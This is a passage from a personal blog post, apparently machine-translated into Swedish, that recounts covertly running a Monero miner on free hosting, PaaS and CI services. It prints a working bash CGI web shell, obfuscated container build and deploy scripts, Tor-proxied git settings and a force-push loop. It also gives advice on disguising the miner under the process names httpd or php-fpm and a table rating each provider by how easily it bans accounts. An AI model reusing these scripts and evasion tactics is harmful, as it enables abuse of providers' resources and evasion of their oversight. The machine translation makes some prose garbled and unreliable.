gäller hanteringar med egen värd, bara startskriptet, kanske läggs till i startsekvensen eller startas manuellt.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanelbaserat webbhotell</a></h3><p>Abonnemangsplaner för webbhotell erbjuds mestadels via [cPanel]. Återigen här använder vi personliga prenumerationsplaner som har rimliga resursgränser, å andra sidan har alla gratisplaner löjliga gränser<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel låter dig definiera hanterare för olika filtillägg, detta gör att vi kan köra skalskript genom<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> med en http -begäran mot ett skalskript som laddats upp på servern. Den här typen av gränssnitt är hur webbskal ser ut<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Ett enkelt bash -webbskal<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Det är bättre att bara förlita sig på inbyggda, eftersom det kanske inte är tillåtet att lägga till ytterligare processer i webbfängelser, men det är alltid möjligt att<code>exec</code> vilket gör att vi kan använda de flesta kommandoradsverktyg. De flesta webbskal är skrivna på andra skriptspråk som python eller php eftersom du inte behöver oroa dig för gaffling.<p>I en cpanelmiljö är det bättre att använda ett statiskt namn för gruvarbetarprocessen, som<code>httpd</code> eller<code>php-fpm</code> eftersom<code>cgi</code> är baserad på flerbearbetning, så servrar fylls alltid med många processer som heter så här, även om en noggrann observatör bör lägga märke till<em> flertrådad</em> användningsmönster som definitivt inte är vanligt (eller möjligt) för språk som perl, php, ruby ​​eller python!<p>Processer har också en tidsgräns som standard, (1 timme, 1 dag, etc.), för detta använder vi bara ett cron -jobb som startar om dropparen.<p>Detta krävde mycket manuell redigering, cpanel api för att automatisera detta är tyvärr inte utsatt för slutanvändare, så webbhotell är ett klumpigt och tråkigt mål för vår gruvarbetare.<h3 id=web_environments><a class=header-anchor href=#web_environments> Webbmiljöer</a></h3><p>Det finns<em> SaaS</em> leverantörer som har en webbredigerare kopplad till en behållare, t.ex.<a href="with a free tier before getting acquired by amazon"> moln9</a> , [codeanywhere], [codenvy]. Det är enkelt att distribuera dropparen här (du har en fullfjädrad miljö), men att hålla den igång är en belastning, eftersom alla interaktiva webbredigerare avslutar sin session strax efter att webbsidan stängts och behållaren följaktligen vilas (om du inte betala såklart).<p>Att kringgå detta kan bara betyda att vi måste hålla sessionerna öppna, en del scripting med [marionettspelare] uppnådde det önskade resultatet, men att ha långa löpningar, minnesläckande, uppblåsta SPA: s webbsidor är definitivt oattraktivt och inte smygande, för från leverantörens backend, en session som öppnas dygnet runt kommer definitivt att se misstänkt ut. Webbmiljöer är faktiskt också klumpiga och tråkiga mål.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Gratis apps -tjänster</a></h3><p>Detta är huvudsakligen<a href="when it used to have a free tier"> öppnar växel</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> och [heroku]. Openshift, att vara kubernetes var något okomplicerat att distribuera, men fullt av konfigurationschurn, här är ett utdrag:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(<span class=hljs-built_in>cat</span> vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(<span class=hljs-built_in>cat</span><span class=hljs-variable>$launcher</span> | <span class=hljs-built_in>tail</span> +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
<span class=hljs-built_in>chmod</span> +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Detta var manuset som användes för att bygga gruvbehållaren som krävde en yaml -mall:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Men hela processen innebar ganska många steg!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span><span class=hljs-built_in>mv</span><span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(<span class=hljs-built_in>date</span> +%s)}</code></pre><p>I pseudokod:<ul><li><p>skapa projektet<li><p>skapa programmet utan en bild<li><p>bygga gruvbehållaren<li><p>distribuera behållaren med en distributionskonfiguration (kubernetes -abstraktion)<li><p>lansera distributionen</ul><p>De<code>build-build</code> skript skapade istället en<em> bygga</em> behållare som skulle gruva några timmar i taget. Byggnader och normala baljor har separata resurser i openshift så vi utnyttjade dem båda. Openshift var totalt sett en dålig upplevelse eftersom det gick över 4 olika utgåvor (kanske fler, jag slutade spåra efter ett tag) och var och en av dem krävde ändringar i konfigurationerna, de hade inga uppgraderingsvägar och allt blev snabbt igen och det var vanligt för byggnader/baljor att stanna, och inte samlas upp skräp ... de körde vanligtvis manuell omstart då och då, kanske var kubernetes bara buggy :)<p>Heroku -konfigurationen var lite enklare (den involverar inte kubernetes). Bortsett från containerbyggnaden, som liknade openshift, var resten bara två cli -kommandon<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Behållaren skjuts direkt med dockaren över till heroku -registret.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Friktionen med heroku (vilken gratis nivå fortfarande står upp till i skrivande stund) är att dynos bara kan köras i 22 dagar per månad så att de krävde lite manuell hantering varje månad, igen klumpiga och tråkiga. De utförde några banvågor i början, och sedan inaktiverade de registreringar via TOR, jag är ganska säker på att jag var orsaken till detta.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CI -behållare eller virtuella datorer</a></h3><p>Dessa var de mest synergiska målen för vår dropper. Det är många<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> företag, varav många bränner investerare pengar och erbjuder gratis nivåer i hopp om att samla en del marknadsandelar inom teknikinfrastruktur.<p>Alla dessa tjänster erbjuder olika resurser, har olika konfigurationskrav och körs i olika miljöer. Jag övervägde aldrig att automatisera kontoregistrering eftersom den typen av saker är fruktansvärda att programmera, jag försöker undvika dem hela tiden, så jag höll på med manuella registreringar ett tag eftersom jag var nyfiken på vilken typ av antispam -svar jag skulle få (och hur annorlunda än resten!). Du kan gissa några saker om företagets ledning utifrån hur det hanterar skräppost:<ul><li><p>Utför den banvågor? Då har de icke -strikta policyer, problem hanteras manuellt och från fall till fall<li><p>Kräver det telefonverifiering? De misshandlades redan tidigare<li><p>Svarar de på tung resursanvändning? De körs på en stram budget<li><p>Tillämpar de kontobegränsningar eller skuggförbud? Om de skuggar, har de genomsnittliga sysadminer.</ul><p>Det finns också en filosofisk fråga: Om en tjänst låter dig missbruka deras system under en lång tid, betyder det då att de har en toppmodern infrastruktur som kan hantera belastningen, eller helt enkelt dålig kontroll över sitt system? Och du måste överväga balansen mellan tillgänglighet och säkerhet, ett för säkert system kan sänka användarens kvarhållande.<p>Här är en tabell som visar några tjänster som jag distribuerade till:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>konfiguration<th style=text-align:center>prestanda<th style=text-align:center>förbud hammare<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>dålig<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>Bra<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>Bra<tr><td style=text-align:center>Kodning<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>dålig<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>Bra<td style=color:green;text-align:center>Bra<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>dålig<td style=color:green;text-align:center>Bra<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Semafor<td style=color:green;text-align:center>Bra<td style=color:green;text-align:center>Bra<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Hamnarbetare<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:green;text-align:center>Bra<tr><td style=text-align:center>Kaj<td style=color:green;text-align:center>Bra<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Kodfräsch<td style=color:red;text-align:center>dålig<td style=color:green;text-align:center>Bra<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>dålig<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>dålig<tr><td style=text-align:center>Kontinuerlig php<td style=color:red;text-align:center>dålig<td style=color:#ff0;text-align:center>medium<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Kompis<td style=color:red;text-align:center>dålig<td style=color:red;text-align:center>dålig<td style=color:red;text-align:center>dålig<tr><td style=text-align:center>Drönare<td style=color:red;text-align:center>dålig<td style=color:green;text-align:center>Bra<td style=color:red;text-align:center>dålig<tr><td style=text-align:center>Transportör<td style=color:red;text-align:center>dålig<td style=color:#ff0;text-align:center>medium<td style=color:red;text-align:center>dålig<tr><td style=text-align:center>Aldrig kod<td style=color:red;text-align:center>dålig<td style=color:green;text-align:center>Bra<td style=color:#ff0;text-align:center>medium<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>dålig<td style=color:green;text-align:center>Bra<td style=color:red;text-align:center>dålig</table><p>I detta sammanhang, a<span style=color:green> Bra</span> konfiguration innebär att det inte tog mycket tid att konfigurera a<code>ci</code> jobb för gruvprocessen (precis som alla tjänster som förlitar sig på en webbpanel istället för en lagringspunkt-fil var ett jobb), en<span style=color:red> dålig</span><code>ban-hammer</code> betyder att det var svårt att registrera sig för tjänsten, eller att konton skulle förbjudas mer aggressivt.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> kräver att man konfigurerar ett projekt, för att dra slutsatsen om miljön, målarkitekturen, körprocessen och andra saker, det var mycket tidskrävande att konfigurera ett bygge så det fick ett dåligt betyg i konfigurationen.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Kontinuerlig php</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Kompis</a> , [Codefresh] hade också många manuella icke -deklarativa konfigurationssteg.<p>Tjänster som [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Kompis</a> tillämpar skuggförbud på kontona, skuggförbud är dåliga, eftersom de låter dig gissa om det är något fel med din konfiguration eller inte. Med vissa tjänster kan du gissa orsaken till förbudet (ganska mycket din byggnad tog för mycket tid, eller du byggde för många gånger på en kort period), för vissa andra som [Azure-pipelines] Jag antar att de använde någon form av fingeravtryck till användarförvaren eftersom förbud kom igenom även utan missbruk av resurser, azurblå och vercel är också begränsade<code>DNS</code> åtkomst inom offentliga byggmaskiner, så det var ytterligare friktion som behövde övervinnas med ad-hoc-tunnel.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Drönare</a> gav åtkomst till en hel 16+ kärnprocessor men slutade med att förbjuda efter 2 builds<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Kodning</a> ger också tillgång till kraftfulla byggvärdar och förbjöd inte lika aggressivt som drönare.<p>Mina favorittjänster var inte på grund av lönsamhet utan för enkelhet och bekvämlighet (även med andra projekt)<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semafor</a> och<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-nav</a> . Travis är som standard CI och är mycket flexibel, Semaphore är den enda<code>DSL</code> för<code>CI</code> det såg lättillgängligt och bra ut istället för bara en oändlig sekvens av spaghettifierade kryssrutor som andra användargränssnitt, och Docker bara för enkelheten att kartlägga dockerfiler till byggnader.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Bygger konfig</a></h3><p>Byggningarna utlöstes antingen av cron -jobb som erbjuds av webbtjänster eller av git commits. Så du var tvungen att hålla reda på en nedskräpning av åtkomsttoken eller ssh -nycklar för att hantera alla git -åtaganden. Det var också viktigt att inte överspamla åtaganden och använda proxyservrar när du flyttar till lagren som konfigurerar git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Med hjälp av git -hostingtjänster har github varit den mer grundliga om förbud, men de utfördes bara efter missbruksrapporter från ci -tjänstens administratörer, gitlab körde en förbudsvåg en gång när jag försökte förnya CI -rättegången (slarvigt). Jag har aldrig fått ett förbud för ett bitbucket -konto. För att (tvinga) push git commits har vi en lång löpande loop som taggar git-förvaret igen:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(<span class=hljs-built_in>ls</span> -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span><span class=hljs-built_in>sleep</span><span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span><span class=hljs-built_in>sleep</span> 1
<span class=hljs-keyword>done</span></code></pre><p>Det kan vara möjligt att kraft som driver på det här sättet inte är något github gillar särskilt mycket och kan ha varit en orsak till att konton flaggades. Taggningsfunktionen som har till uppgift att tvinga fram olika åtaganden, använder en webbplats (som du kan leta upp ganska enkelt) som ger några randomiserade åtaganden. Jag är inte säker på hur mycket detta hjälper, eftersom själva innehållet i åtagandena uppenbarligen är misstänkt för mitt fall. Och det bet mig också i rumpan en gång, eftersom åtagandena som returneras av detta kommando kan innehålla svordomar, en av mina åtaganden plockades upp av en twitterbot som spårar git -commits med svordomar! Jag lade till en svartlista för dåliga ord efter händelsen.<p>Jag har inte riktigt fördjupat mig i obfuscated git commits och obfuscated git repositories. Den enda instansen där jag använde ett mer genomarbetat arkiv var med Bitrise eftersom du inte kunde konfigurera en build om systemet inte kände igen en miljö (som mobilappar), men även då var det ingen rotation och det var alltid samma förvar, ganska lätt att upptäcka.<p>Sammantaget om jag var tvungen att rita en klockkurva runt den optimala tiden för min<em> utan</em>att få konton förbjudna, för alla testade tjänster, skulle vara med ett center på cirka 1 timme byggtid, en gång per dag. För cpu-kärnor, bortsett från ett par ut-lögnare (som drönare), förväntar de flesta tjänster att du använder hela resurserna som ges till dig eftersom builds körs inuti virtuella datorer eller containrar med begränsade resurser ... och sammanställning är vanligtvis en uppgift som mättar cpu, så det har inte statistisk relevans. Intuitivt en byggnad per dag är vad den genomsnittliga utvecklaren skulle göra, så du bör förvänta dig upphöjda flaggor om du avviker från medelvärdet, och att driva på missbruk slutar aldrig bra.<h2 id=conclusions><a class=header-anchor href=#conclusions> Slutsatser</a></h2><p>Var det värt det? Nätverksdelarna var definitivt intressanta, hanteringen av kontoregistreringar var uppenbarligen den värsta delen, ingen gillar att klicka på oändliga bekräftelsemail och upprepade sinnesdämpande UI -procedurer, trots allt. Att skriva skräppostautomatiseringsprogram är också tråkigt (eftersom du mest petar på dumma API: er), och med detta antagande (och det faktum att detta aldrig var något allvarligt) har jag aldrig ens övervägt det. Var det lönsamt? På sin höjd nådde den något liknande<code>300$</code> per månad, kanske tillräckligt för en venezuelan, inte riktigt för mig :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> den sura sysadminen</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>även om detta skulle bryta många sekretessantaganden, är jag säker på att de flesta bara tittar in när det finns ett pågående problem, men det här är bara ett problem för containerbaserade körtider, medan virtuella datorer är i stort sett svarta lådor.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>gruvarbetaren inbyggd i monero -noden fick lite arbete för att göra den mer bakgrundsvänlig, men distributionen av xmrig fokuserades aldrig på bakgrundsvänlighet.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>vissa pooler erbjuder olika svårigheter på olika anslutningsportar och tenderar att anpassa jobbproblemet till gruvarbetarens inlämnade aktier, men proxyens granularitet var fortfarande bekvämare, eftersom det skulle förhindra pool<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> låsa in</a> (även om vi aldrig riktigt bytte pool).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>det var inte lyckligt när konfigurationen plötsligt dök upp och försvann från filsystemet</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Vi pratar inte om<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> skiktprotokoll</a> eftersom vi bara måste hantera det som implementeras i<em> både</em> poolen och gruvarbetaren ... som vanligtvis är det lägsta minimum, och möjligen med icke -standardtillägg.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>gå aldrig för fullt :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Jag har inte undersökt vad som händer när en process läser in ytterligare funktionalitet vid körning, eftersom kärnan skulle leta efter adressen i minneslayouten för den körbara filen, vilket skulle komma åt filsystemet och eventuellt orsaka en krasch.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Gränser är godtyckliga, CPU -tiden är mindre än en sekund, minnet är mindre än 128M, utgående anslutningar blockeras.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>med lite tålamod kan du också köra en fullständig ssh -instans över en miljö som startas runt ditt cpanel -kontoutrymme,<em> utan</em> ha tillgång till cpanel inbyggd SSH som tenderar att inaktiveras av värdleverantörer.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift gick från en 1 års gratis nivå till 3 månader till 1 månad, började kräva telefonautentisering, jag kan garantera att jag inte var den enda som missbrukade deras tjänster.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Herokus fria lagerbehållare är ganska generösa i resurser, de ger 4c/8t (virtuell) cpus, gott om ram och stor lagring (som dock inte är ihållande och kasseras vid dyno -avstängning).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>De adderar muc striktare registreringsregler, efter ett par förbud kunde jag ha bidragit till det.</table><p><div id=post-tags-list>Inläggstaggar: <span class=post-tag><a href=https://www.unto.re/tag/crypto> krypto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> netto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> skal</a></span></div><div class=page-foot><div class=copyright>21 augusti 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Drivs av<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/sv/sitemapxml> Webbplatskarta</a></li> | <li><a href=/sv/tag> Taggar</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>